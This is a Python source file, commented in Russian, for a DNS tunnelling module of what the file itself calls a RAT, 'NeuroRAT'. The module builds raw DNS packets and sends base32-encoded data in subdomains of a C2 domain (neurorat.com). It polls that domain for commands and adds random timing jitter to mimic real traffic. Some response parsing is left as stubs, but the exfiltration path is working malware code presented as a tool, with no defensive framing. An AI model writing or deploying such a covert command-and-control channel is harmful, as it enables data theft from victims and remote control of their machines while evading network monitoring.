#!/usr/bin/env python3
"""
DNS Tunnel Module - Модуль для скрытой передачи данных через DNS-запросы
Обеспечивает двусторонний канал связи с C2-сервером через DNS-запросы
"""

import os
import base64
import time
import random
import socket
import struct
from common.utils import get_logger
import logging
import binascii
import threading
from typing import Dict, List, Any, Optional, Tuple, Union, Callable

# DNS-заголовки и константы
DNS_QUERY_TYPE_A = 1
DNS_QUERY_TYPE_TXT = 16
DNS_CLASS_IN = 1

class DNSTunnel:
    """
    Класс для реализации DNS-туннелирования
    Позволяет передавать данные, закодированные в DNS-запросах
    """
    
    def __init__(
        self,
        c2_domain: str = "neurorat.com",
        query_interval: float = 1.0,
        jitter: float = 0.3,
        max_chunk_size: int = 30,
        callback: Optional[Callable[[bytes], None]] = None
    ):
        """
        Инициализация DNS-туннеля
        
        Args:
            c2_domain: Домен C2-сервера
            query_interval: Интервал между запросами (секунды)
            jitter: Случайное отклонение для интервала (доля от интервала)
            max_chunk_size: Максимальный размер чанка для передачи
            callback: Колбэк для обработки полученных данных
        """
        self.c2_domain = c2_domain
        self.query_interval = query_interval
        self.jitter = jitter
        self.max_chunk_size = max_chunk_size
        self.callback = callback
        
        self.is_running = False
        self.receive_thread = None
        self.session_id = self._generate_session_id()
        self.sequence = 0
        
        # Настройка логирования
        self.logger = get_logger("dns_tunnel")
    
    def _generate_session_id(self) -> str:
        """Генерирует уникальный идентификатор сессии"""
        return binascii.hexlify(os.urandom(4)).decode()
    
    def start(self) -> bool:
        """Запускает DNS-туннель"""
        if self.is_running:
            return False
            
        self.is_running = True
        self.receive_thread = threading.Thread(
            target=self._receive_loop,
            daemon=True,
            name="DNS-Tunnel-Receiver"
        )
        self.receive_thread.start()
        
        self.logger.info(f"DNS-туннель запущен с сессией {self.session_id}")
        return True
    
    def stop(self) -> None:
        """Останавливает DNS-туннель"""
        self.is_running = False
        if self.receive_thread and self.receive_thread.is_alive():
            self.receive_thread.join(timeout=3)
        
        self.logger.info("DNS-туннель остановлен")
    
    def send(self, data: bytes) -> bool:
        """
        Отправляет данные через DNS-туннель
        
        Args:
            data: Бинарные данные для отправки
            
        Returns:
            bool: Успешность операции
        """
        # Кодируем данные в base32 (DNS-friendly)
        encoded_data = base64.b32encode(data).decode().rstrip('=').lower()
        
        # Разбиваем на чанки
        chunks = [encoded_data[i:i+self.max_chunk_size] for i in range(0, len(encoded_data), self.max_chunk_size)]
        
        success = True
        for i, chunk in enumerate(chunks):
            # Формируем поддомен с данными: [seq].[chunk].[session_id].[c2_domain]
            seq = f"{i:02x}"
            subdomain = f"{seq}.{chunk}.{self.session_id}.{self.c2_domain}"
            
            # Отправляем DNS-запрос
            try:
                self._send_dns_query(subdomain, query_type=DNS_QUERY_TYPE_TXT)
                # Добавляем случайную задержку для имитации реального трафика
                jitter_value = self.query_interval * self.jitter * random.uniform(-1, 1)
                time.sleep(self.query_interval + jitter_value)
            except Exception as e:
                self.logger.error(f"Ошибка при отправке DNS-запроса: {e}")
                success = False
        
        self.sequence += 1
        return success
    
    def _send_dns_query(self, domain: str, query_type: int = DNS_QUERY_TYPE_A) -> Optional[List[bytes]]:
        """
        Отправляет DNS-запрос к указанному домену
        
        Args:
            domain: Доменное имя для запроса
            query_type: Тип DNS-запроса (A, TXT и т.д.)
            
        Returns:
            Optional[List[bytes]]: Ответы на запрос или None
        """
        try:
            # Создаем DNS-пакет
            # Заголовок: transaction ID, flags, counts
            transaction_id = random.randint(0, 65535)
            packet = struct.pack(">HHHHHH", 
                transaction_id,  # Transaction ID
                0x0100,          # Flags (стандартный запрос)
                1,               # Questions count
                0,               # Answer count
                0,               # Authority count
                0                # Additional count
            )
            
            # Добавляем доменное имя в формате DNS (каждая часть предваряется длиной)
            for part in domain.split('.'):
                packet += struct.pack("B", len(part))
                packet += part.encode()
            
            packet += struct.pack("B", 0)  # Завершающий нулевой байт
            packet += struct.pack(">HH", query_type, DNS_CLASS_IN)  # QTYPE и QCLASS
            
            # Отправляем запрос к DNS-серверу
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3.0)
            
            # Используем системный DNS-сервер
            dns_server = self._get_system_dns_server()
            sock.sendto(packet, (dns_server, 53))
            
            # Получаем ответ
            response, _ = sock.recvfrom(4096)
            sock.close()
            
            # Обрабатываем ответ (упрощенно)
            if len(response) < 12:
                return None
                
            # Парсим заголовок
            header = struct.unpack(">HHHHHH", response[:12])
            answer_count = header[3]
            
            if answer_count == 0:
                return None
                
            # В реальном коде здесь должен быть полный парсинг DNS-ответа
            # для извлечения полезной нагрузки из TXT-записей
            
            return [response]
        
        except Exception as e:
            self.logger.error(f"Ошибка DNS-запроса: {e}")
            return None
    
    def _get_system_dns_server(self) -> str:
        """Получает адрес системного DNS-сервера"""
        # В реальном коде здесь должна быть платформо-зависимая логика
        # для получения системного DNS-сервера
        # Для примера возвращаем Google DNS
        return "8.8.8.8"
    
    def _receive_loop(self) -> None:
        """Цикл приема данных через DNS-туннель"""
        while self.is_running:
            try:
                # Отправляем запрос на получение данных
                poll_domain = f"poll.{self.session_id}.{self.c2_domain}"
                responses = self._send_dns_query(poll_domain, query_type=DNS_QUERY_TYPE_TXT)
                
                if responses:
                    # Обрабатываем полученные данные
                    for response in responses:
                        # В реальном коде здесь должно быть извлечение и декодирование данных
                        # из TXT-записей DNS-ответа
                        
                        # Для простоты предположим, что ответ уже извлечен
                        if self.callback:
                            self.callback(response)
                
                # Добавляем случайную задержку для имитации реального трафика
                jitter_value = self.query_interval * self.jitter * random.uniform(-1, 1)
                time.sleep(self.query_interval + jitter_value)
            
            except Exception as e:
                self.logger.error(f"Ошибка в цикле приема: {e}")
                time.sleep(self.query_interval)  # Продолжаем попытки

# Тестирование модуля
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    def data_callback(data: bytes) -> None:
        print(f"Получены данные: {data}")
    
    tunnel = DNSTunnel(callback=data_callback)
    tunnel.start()
    
    try:
        # Отправляем тестовое сообщение
        tunnel.send(b"Hello from NeuroRAT!")
        time.sleep(10)  # Даем время на обработку
    finally:
        tunnel.stop() 